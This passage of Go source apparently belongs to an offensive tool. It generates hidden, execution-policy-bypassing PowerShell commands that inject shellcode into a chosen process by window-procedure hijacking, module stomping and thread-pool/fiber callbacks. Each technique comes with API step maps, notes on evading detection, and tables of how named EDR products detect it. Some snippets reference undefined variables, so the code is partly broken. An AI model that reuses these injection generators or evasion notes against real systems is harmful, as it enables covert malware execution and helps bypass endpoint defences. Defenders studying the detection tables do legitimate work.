			`$swp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('user32'),'SetWindowLongPtrA'),`+
			`[Func[IntPtr,int,IntPtr,IntPtr]]); `+
			`$cwp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('user32'),'CallWindowProcW'),`+
			`[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,int]]); `+
			`$callback=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualAlloc'),`+
			`[Func[int,int,int,int,int]]).Invoke(0,64,0x3000,0x40); `+
			`$swp.Invoke($callback,-4,$addr); `+
			`$cwp.Invoke($addr,$callback,0,0,0)"`,
		targetPID,
	), nil
}

func ExtraWindowMemoryAPIMap() map[int]string {
	return map[int]string{
		1: "VirtualAlloc(NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) -> lpShellcode",
		2: "RtlCopyMemory(lpShellcode, shellcode, dwSize) -> write shellcode",
		3: "FindWindowA(className, windowName) -> hWnd (find target window by class or title)",
		4: "SetWindowLongPtr(hWnd, GWLP_WNDPROC, lpShellcode) -> replace window procedure with shellcode address",
		5: "CallWindowProcW(lpShellcode, hWnd, msg, wParam, lParam) -> invoke replaced window procedure",
		6: "Alternative: SendMessage(hWnd, WM_COMMAND, 0, 0) -> triggers window procedure via message loop",
		7: "Alternative: SetWindowLongPtr(hWnd, nIndex, atomID) -> store shellcode pointer in Extra Window Memory bytes",
		8: "Remote variant: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> EnumWindows -> SetWindowLongPtr on remote windows",
		9: "GWLP_WNDPROC = -4 (GWL_WNDPROC for 64-bit), GWLP_USERDATA = -21 for storing data pointer",
	}
}

func ExtraWindowMemoryDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":           "NOT triggered - no thread creation, uses window message loop",
		"Sysmon EventID 10":          "ProcessAccess if remote variant uses OpenProcess",
		"EventID 4688":               "Process Creation NOT relevant",
		"ETW Microsoft-Windows-Kernel-General": "Window procedure changes via SetWindowLongPtr can be traced",
		"CrowdStrike Falcon":         "CS detects via SetWindowLongPtr with non-standard procedure addresses and unusual CallWindowProc usage",
		"SentinelOne":                "S1 monitors for SetWindowLongPtr(GWLP_WNDPROC) pointing to dynamically allocated memory",
		"Microsoft Defender":         "MDE detects via user32 callback ETW events - replaced window procedures in Extra Window Memory",
		"Carbon Black":               "CB detects via unusual SetWindowLongPtr + CallWindowProc chain with non-module code addresses",
	}
}

func InjectModuleStompDLLHollowing(targetPID int, targetModule string, payload []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if targetModule == "" {
		return "", fmt.Errorf("empty target module name")
	}
	if len(payload) == 0 {
		return "", fmt.Errorf("empty payload")
	}
	_ = payload
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$mod=[PoshWin32.Kernel32]::GetModuleHandle('%s'); `+
			`$modInfo=New-Object PoshWin32.MODULEINFO; `+
			`[PoshWin32.Kernel32]::GetModuleInformation($h,$mod,[ref]$modInfo,[System.Runtime.InteropServices.Marshal]::SizeOf($modInfo)); `+
			`$old=0; `+
			`[PoshWin32.Kernel32]::VirtualProtectEx($h,[IntPtr]($modInfo.BaseAddress.ToInt64()+0x1000),0x1000,0x40,[ref]$old); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,[IntPtr]($modInfo.BaseAddress.ToInt64()+0x1000),$payload,$payload.Length,[ref]0); `+
			`$ep=[PoshWin32.Kernel32]::GetProcAddress($mod,'DllMain'); `+
			`[PoshWin32.Kernel32]::VirtualProtectEx($h,[IntPtr]($modInfo.BaseAddress.ToInt64()+0x1000),0x1000,$old,[ref]$old); `+
			`[PoshWin32.Kernel32]::CreateRemoteThread($h,0,0,[IntPtr]($modInfo.BaseAddress.ToInt64()+0x1000),0,0,0)"`,
		targetPID, targetModule,
	), nil
}

func InjectModuleStompSpecific(targetPID int, dllName string) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if dllName == "" {
		return "", fmt.Errorf("empty DLL name")
	}
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$mod=[PoshWin32.Kernel32]::GetModuleHandle('%s'); `+
			`$modInfo=New-Object PoshWin32.MODULEINFO; `+
			`[PoshWin32.Kernel32]::GetModuleInformation($h,$mod,[ref]$modInfo,[System.Runtime.InteropServices.Marshal]::SizeOf($modInfo)); `+
			`$old=0; $dll64=($modInfo.BaseAddress.ToInt64()); `+
			`$peOffset=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($dll64+0x3C)); `+
			`$sectionCnt=[System.Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]($dll64+$peOffset+6)); `+
			`$optHdr=$peOffset+24; $secHdr=$optHdr+240; `+
			`for($i=0;$i -lt $sectionCnt;$i++){`+
			`$secAddr=$secHdr+($i*40); `+
			`$secName=[System.Text.Encoding]::ASCII.GetString([byte[]][IntPtr[]][IntPtr]($dll64+$secAddr),8); `+
			`if($secName -eq '.text'){`+
			`$va=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($dll64+$secAddr+12)); `+
			`$rva=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($dll64+$secAddr+20)); `+
			`$sz=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($dll64+$secAddr+16)); `+
			`[PoshWin32.Kernel32]::VirtualProtectEx($h,[IntPtr]($dll64+$rva),$sz,0x40,[ref]$old); `+
			`Write-Host \"Stomped .text at 0x$($rva.ToString('X')) size $sz\"; `+
			`[PoshWin32.Kernel32]::VirtualProtectEx($h,[IntPtr]($dll64+$rva),$sz,$old,[ref]$old); `+
			`break}}; `+
			`[PoshWin32.Kernel32]::CreateRemoteThread($h,0,0,$mod,0,0,0)"`,
		targetPID, dllName,
	), nil
}

func ModuleStompDLLHollowingAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess",
		2: "VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) -> lpRemoteAddr",
		3: "WriteProcessMemory(hProcess, lpRemoteAddr, shellcode, payloadSize, NULL) -> write shellcode to target",
		4: "GetModuleHandle(targetModule) -> hModule (e.g., ntdll.dll, twinapi.dll)",
		5: "GetModuleInformation(hProcess, hModule, &modInfo) -> get module base, size, entry point",
		6: "Parse PE headers: read e_lfanew -> IMAGE_NT_HEADERS -> Section headers -> find .text section",
		7: "VirtualProtectEx(hProcess, moduleBase + .text V.A., .textSize, PAGE_EXECUTE_READWRITE, &oldProtect) -> make writable",
		8: "WriteProcessMemory(hProcess, moduleBase + .text V.A., shellcode, shellcodeSize, NULL) -> overwrite .text",
		9: "VirtualProtectEx(hProcess, moduleBase + .text V.A., .textSize, oldProtect, &oldProtect) -> restore RX",
		10: "CreateRemoteThread(hProcess, NULL, 0, moduleBase + .text V.A., NULL, 0, NULL) -> execute at replaced module code",
		11: "Key evasion: No new module loaded (looks like legit ntdll.dll), no remote memory allocation in target",
	}
}

func ModuleStompDLLHollowingDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":           "CreateRemoteThread to module .text section detected",
		"Sysmon EventID 10":          "ProcessAccess detected for OpenProcess",
		"Sysmon EventID 7":           "ImageLoad NOT triggered - no new DLL loaded (key evasion)",
		"EventID 4688":               "Process Creation NOT relevant - operates on existing process",
		"ETW Microsoft-Windows-Kernel-Process": "WriteProcessMemory to loaded module code section captured",
		"CrowdStrike Falcon":         "CS detects via memory page protection changes on module .text sections",
		"SentinelOne":                "S1 detects via module integrity verification - code section hash mismatch",
		"Microsoft Defender":         "MDE detects via VirtualProtectEx(PAGE_EXECUTE_READWRITE) on known module sections",
		"Carbon Black":               "CB detects via WriteProcessMemory targeting loaded module code regions",
		"Elastic EDR":                "Elastic detects via 'Module Stomping' rule - .text section modification of loaded DLL",
		"Memory Scan":                "Module .text section PE validation fails - code does not match known DLL hash on disk",
	}
}

func InjectTPDirectFiber(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$kernel32=[PoshWin32.Kernel32]::GetModuleHandle('kernel32'); `+
			`$ctpw=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'CreateThreadpoolWork'),`+
			`[Func[IntPtr,IntPtr,IntPtr,IntPtr]]); `+
			`$fiberStub=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x2000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$fiberStub,$payload,$payload.Length,[ref]0); `+
			`$pwork=$ctpw.Invoke($fiberStub,0,0); `+
			`$stpw=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'SubmitThreadpoolWork'),`+
			`[Func[IntPtr,int]]); `+
			`$stpw.Invoke($pwork)"`,
		targetPID,
	), nil
}

func TPDirectFiberAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess (remote variant)",
		2: "VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) -> shellcodeAddr",
		3: "WriteProcessMemory(hProcess, shellcodeAddr, shellcode, dwSize, NULL) -> write shellcode to target",
		4: "CreateThreadpoolWork(shellcodeAddr, NULL, NULL) -> pWork (register shellcode as thread pool callback)",
		5: "SubmitThreadpoolWork(pWork) -> schedule work item on thread pool",
		6: "Thread pool worker thread picks up work item -> executes shellcode callback",
		7: "Fiber variant: callback performs ConvertThreadToFiber -> CreateFiber -> SwitchToFiber for double-stealth",
		8: "Key evasion: Uses both existing thread pool threads AND fiber context switching",
		9: "No CreateRemoteThread, no CreateThread, no new process creation",
	}
}

func TPDirectFiberDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":           "NOT triggered - no thread creation, uses existing thread pool workers",
		"Sysmon EventID 10":          "ProcessAccess detected for OpenProcess in remote variant",
		"EventID 4688":               "Process Creation NOT relevant",
		"ETW Microsoft-Windows-Kernel-ThreadPool": "Thread pool callback registration + execution captured via ETW",
		"ETW Microsoft-Windows-Kernel-Process": "Fiber creation within thread pool context may be visible via fiber ETW",
		"CrowdStrike Falcon":         "CS detects via combined thread pool + fiber callback anomalies in kernel telemetry",
		"SentinelOne":                "S1 monitors for CreateThreadpoolWork with callbacks to allocated memory + fiber conversion chain",
		"Microsoft Defender":         "MDE detects via TP_DIRECT structures containing fiber conversion callbacks",
		"Memory Scan":                "Thread pool callback list entries point to non-image memory with fiber setup code",
	}
}
